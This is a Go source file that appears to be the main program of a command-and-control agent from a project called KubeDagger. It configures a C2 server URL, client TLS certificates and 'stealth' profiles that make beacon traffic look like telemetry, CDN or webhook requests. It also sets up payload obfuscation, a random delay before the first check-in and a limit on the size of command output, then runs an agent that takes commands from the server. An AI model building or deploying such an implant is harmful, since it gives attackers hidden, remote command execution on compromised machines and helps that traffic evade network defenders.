package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/agent"
	"github.com/yasindce1998/KubeDagger/pkg/agent/stealth"
	"github.com/yasindce1998/KubeDagger/pkg/c2server"
)

func main() {
	var (
		serverURL  = flag.String("server", "https://127.0.0.1:443", "C2 server URL")
		agentID    = flag.String("id", "", "agent ID (auto-generated if empty)")
		caPath     = flag.String("ca", "", "path to CA cert PEM for server verification")
		certPath   = flag.String("cert", "", "path to agent client cert PEM")
		keyPath    = flag.String("key", "", "path to agent client key PEM")
		plaintext  = flag.Bool("plaintext", false, "disable TLS (development only)")
		logLevel   = flag.String("log-level", "info", "log level")
		profile    = flag.String("profile", "telemetry", "endpoint profile: legacy, telemetry, cdn, webhook")
		obfuscate  = flag.Bool("obfuscate", false, "enable payload obfuscation")
		obfuscKey    = flag.String("obfusc-key", "", "shared secret for payload obfuscation")
		psk          = flag.String("psk", "", "pre-shared key for X-Api-Key auth")
		maxOutput    = flag.Int("max-output", 1<<20, "max command output size in bytes")
		initialDelay = flag.Duration("initial-delay", 30*time.Second, "random initial delay before first checkin")
	)
	flag.Parse()

	level, err := logrus.ParseLevel(*logLevel)
	if err != nil {
		logrus.Fatalf("invalid log level: %v", err)
	}
	logrus.SetLevel(level)

	tcfg := agent.TransportConfig{
		Endpoints: stealth.GetProfile(*profile),
		Obfuscate: *obfuscate,
		ObfuscKey: *obfuscKey,
		PSK:       *psk,
	}

	var transport *agent.Transport
	if *plaintext {
		transport = agent.NewTransport(*serverURL, nil, tcfg)
	} else {
		tlsCfg, err := buildAgentTLS(*caPath, *certPath, *keyPath)
		if err != nil {
			logrus.Fatalf("TLS setup: %v", err)
		}
		transport = agent.NewTransport(*serverURL, tlsCfg, tcfg)
	}

	cfg := agent.Config{
		ServerURL:    *serverURL,
		AgentID:      *agentID,
		InitialDelay: *initialDelay,
		MaxOutput:    *maxOutput,
	}

	a := agent.New(cfg, transport)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		logrus.Info("signal received, shutting down")
		a.Stop()
		cancel()
	}()

	if err := a.Run(ctx); err != nil && err != context.Canceled {
		logrus.Fatalf("agent exited: %v", err)
	}
}

func buildAgentTLS(caPath, certPath, keyPath string) (*tls.Config, error) {
	if caPath == "" || certPath == "" || keyPath == "" {
		return nil, fmt.Errorf("--ca, --cert, and --key are required when TLS is enabled")
	}

	caPEM, err := os.ReadFile(caPath)
	if err != nil {
		return nil, fmt.Errorf("read CA: %w", err)
	}

	certPEM, err := os.ReadFile(certPath)
	if err != nil {
		return nil, fmt.Errorf("read cert: %w", err)
	}

	keyPEM, err := os.ReadFile(keyPath)
	if err != nil {
		return nil, fmt.Errorf("read key: %w", err)
	}

	agentCert := &c2server.CertPair{CertPEM: certPEM, KeyPEM: keyPEM}
	return c2server.BuildAgentTLSConfig(agentCert, caPEM)
}
